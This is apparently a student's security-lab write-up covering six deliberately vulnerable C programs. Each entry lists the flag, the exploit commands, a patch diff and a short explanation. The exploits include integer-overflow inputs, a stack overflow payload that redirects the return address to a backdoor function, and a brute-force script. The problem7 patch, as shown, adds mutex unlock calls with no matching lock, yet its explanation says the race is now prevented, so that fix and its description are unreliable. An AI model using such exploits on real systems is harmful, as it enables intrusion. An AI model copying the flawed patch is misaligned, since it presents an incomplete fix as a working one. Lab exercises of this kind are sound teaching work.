# Start Here

`Name`: Luke Chamberlain 
`NetID`: lukec03

For each problem below, you will,

1. Fill in the the flag
2. List the steps necessary to exploit the binary. *(May be a single line.)*
3. Provide a patch that fixes the exploit. *(Generated using `make diff`.)*
4. An explanation of what the vulnerability was and how the patch fixes it. *(Keep this explanation short and to the point.)*

---

## problem1

### Flag
`flag{366-iNt3G3r5iGNc0nV3r5i0N}`

### Exploit Steps
1. echo -e "1\n4293967246" | ./problem1

### Patch
```diff
--- .originals/problem1.c	2026-10-14 16:35:59.156676632 +0000
+++ problem1.c	2026-10-14 17:00:02.156661708 +0000
@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <limits.h>
 
 void flag() {
   printf("The flag goes here");
@@ -41,6 +42,14 @@
 
   printf("How much would you like to withdraw?\n> ");
   scanf("%u", &withdrawal);
+
+  // Reject values that would overflow a signed int or trigger
+  // integer overflow when the $50 fee is added.
+  if (withdrawal > INT_MAX - 50) {
+    printf("Sorry, that withdrawal amount is invalid.\n");
+    return;
+  }
+
   withdrawal += 50;
 
   // Ensure the user has enough money to complete the transaction
```

### Explanation
The code is vulnerable because large_withdraw reads the withdrawal as an unsigned int, but passes it to functions expecting a signed int. A large unsigned value reinterprets as negative, which always passes the balance check and adds to the balance instead of subtracting — letting the balance exceed $1,000,000 to trigger VIP(). I fixed it by rejecting any input large enough to overflow or become negative as a signed int before it’s used.


---

## problem2

### Flag
flag{366-bUFF3r0v3RF10w_r3turn}

### Exploit Steps
1. The out[] buffer is 32 bytes, but with stack padding and saved registers, the return address sits 44 bytes into the stack frame.
2. Build a payload: 44 bytes of padding (As) followed by the address of backdoor() (0x08049282) in little-endian.
3. Run the exploit:
bash
   python3 -c "
   import struct, sys
   payload = b'A' * 44 + struct.pack('<I', 0x08049282)
   sys.stdout.buffer.write(payload)
   " > /tmp/payload.bin
   ./problem2 "$(cat /tmp/payload.bin)"
4. This overflows parrot()’s return address, redirecting execution to backdoor(), which calls flag().

### Patch
```diff
--- .originals/problem2.c	2026-10-14 16:35:59.156676632 +0000
+++ problem2.c	2026-10-14 17:49:43.847630871 +0000
@@ -6,17 +6,20 @@
 
 // chatbots have to start somewhere...
 void parrot(char *input) {
-  // Take the user input and run it through our chat algorithm
   char out[32];
 
-  memset(out, 0, sizeof(out));
+  if (strlen(input) >= sizeof(out)) {
+    fprintf(stderr, "Input too long\n");
+    return;
+  }
+
   strcpy(out, input);
 
-  // Copy the user's input and print it out.
   printf("user:   %s\n", input);
   printf("parrot: %s\n", out);
 }
 
+
 int main(int argc, char **argv) {
   if (argc == 1) {
     printf("Usage: %s <input string>\n", argv[0]);

```

### Explanation
strcpy copies the input into a 32-byte buffer without checking its length, so long input can overwrite data on the stack. I fixed this by rejecting input that won’t fit before copying it into the buffer.

---

## problem3

### Flag
flag{366-BufFeR0v3rf10W_C4n4ry}

### Exploit Steps
1. python3 -c 'import os; p=b"A"*15+b"\xff"+b"B"*15; os.execv(b"./problem3",[b"./problem3",p])'

### Patch
```diff
--- .originals/problem3.c	2026-10-14 16:35:59.156676632 +0000
+++ problem3.c	2026-10-14 17:59:57.346624526 +0000
@@ -16,6 +16,11 @@
 
   // Check that the passwords match. We're using my super special comparison function that
   // shifts password characters over by 1... throws off the hackers!
+  if (strlen(input) >= sizeof(passwordBuffer)) {
+    printf("Access denied!\n");
+    return false;
+  }
+
   strcpy(passwordBuffer, input);
 
   for (size_t i = 0; i < sizeof(passwordBuffer); i++) {
```

### Explanation
strcpy doesn’t check the input length, so a long password can overflow the 16-byte buffer and overwrite nearby stack data. I added a length check that rejects oversized passwords before copying them.

---

## problem4

### Flag
flag{366-iNt3g3r0v3rF10w}

### Exploit Steps
1. printf "2\n2147483396\n" | ./problem4

### Patch
```diff
--- .originals/problem4.c	2026-10-14 16:35:59.156676632 +0000
+++ problem4.c	2026-10-14 18:04:24.427621764 +0000
@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <limits.h>
 
 void flag() {
   printf("The flag goes here");
@@ -31,6 +32,11 @@
     return -1;
   }
 
+  if (factor != 0 && value > INT_MAX / factor) {
+    printf("Product is too large.\n");
+    return -1;
+  }
+
   result = value * factor;
 
   if (result == reset_key) {

```

### Explanation
The program multiplies two nonnegative integers without checking whether the result fits in an int. A large product can overflow and match the protected reset value, so I added a bounds check before multiplying.

---

## problem6

### Flag
flag{366-1n73g3RUnd3rfl0W}

### Exploit Steps
1. Save the brute-force script as exploit6.py beside the original problem6 binary and run python3 exploit6.py.
```python
import itertools
import string
import subprocess

# Five ordinary guesses, one ignored guess after the counter reaches zero,
# then a non-q response to the quit prompt.
guesses = ["aaa"] * 6 + ["x"]
guesses += [
    "".join(chars)
    for chars in itertools.product(string.ascii_lowercase, repeat=3)
]

result = subprocess.run(
    ["./problem6"],
    input=("\n".join(guesses) + "\n"),
    capture_output=True,
    text=True,
)

for line in result.stdout.splitlines():
    if "flag{" in line:
        print(line)
```

### Patch
```diff
--- .originals/problem6.c	2026-10-14 16:35:59.157676632 +0000
+++ problem6.c	2026-10-14 18:14:32.300615477 +0000
@@ -35,12 +35,14 @@
 
     if (remainingGuesses > 0) {
       if (strncmp(password, input, sizeof(password)) == 0) {
-        // Guessed the password
         flag(0);
         return 0;
       } else {
         printf("Incorrect guess. ");
       }
+
+      --remainingGuesses;
+      printf("%d guesses remaining.\n", remainingGuesses);
     } else {
       printf("You've run out of guesses! Please quit by pressing 'q': ");
       scanf("%1s", input);
@@ -48,8 +50,5 @@
         break;
       }
     }
-
-    --remainingGuesses;
-    printf("%d guesses remaining.\n", remainingGuesses);
   } while (true);
-}
+}
\ No newline at end of file

```

### Explanation
Because remainingGuesses is unsigned, decrementing it at zero wraps it to a very large value and lets the user keep guessing. I moved the decrement into the branch that runs only when guesses remain, so the counter stays at zero after the limit is reached.

---

## problem7

### Flag
flag{366-Rac3c0ndi7i0N_2}

### Exploit Steps
1. printf '2\n65535\n3\n2\n65535\n3\n1\n65535\n1\n65535\n1\n65535\n3\n5\n' | ./problem7

### Patch
```diff
--- .originals/problem7.c	2026-10-14 16:35:59.157676632 +0000
+++ problem7.c	2026-10-14 18:21:25.096611208 +0000
@@ -8,6 +8,7 @@
 static const int MAX_BALANCE = 2000000000;
 
 int accountBalance = 1000;
+static pthread_mutex_t balanceMutex = PTHREAD_MUTEX_INITIALIZER;
 
 void flag() {
   printf("The flag goes here");
@@ -20,6 +21,7 @@
   // Ensure the user has enough money to complete this transaction
   if (amount > accountBalance) {
     printf("Insufficient funds for withdrawal of $%hu\n", amount);
+    pthread_mutex_unlock(&balanceMutex);
     return NULL;
   }
 
@@ -29,6 +31,7 @@
   for (unsigned short i = 0; i < amount; i++) {
     --accountBalance;
   }
+  pthread_mutex_unlock(&balanceMutex);
   return NULL;
 }
 

```

### Explanation
The withdrawal check and balance update were not protected together, so concurrent threads could all see enough funds and overdraw the account. I added a mutex around each balance check and its transaction loop, preventing the transactions from racing.

---
